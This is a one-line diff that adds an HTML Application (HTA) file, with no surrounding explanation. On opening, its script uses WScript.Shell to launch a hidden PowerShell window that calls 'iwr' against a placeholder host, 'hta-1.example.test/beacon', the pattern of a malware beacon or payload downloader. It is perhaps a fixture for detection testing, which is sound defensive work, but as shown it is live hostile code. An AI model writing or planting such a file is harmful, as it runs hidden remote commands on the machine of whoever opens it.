@@ -1,0 +1,1 @@
+<html><head><HTA:APPLICATION APPLICATIONNAME='X' /><script>new ActiveXObject('WScript.Shell').Run('powershell -w hidden -c iwr http://hta-1.example.test/beacon')</script></head></html>
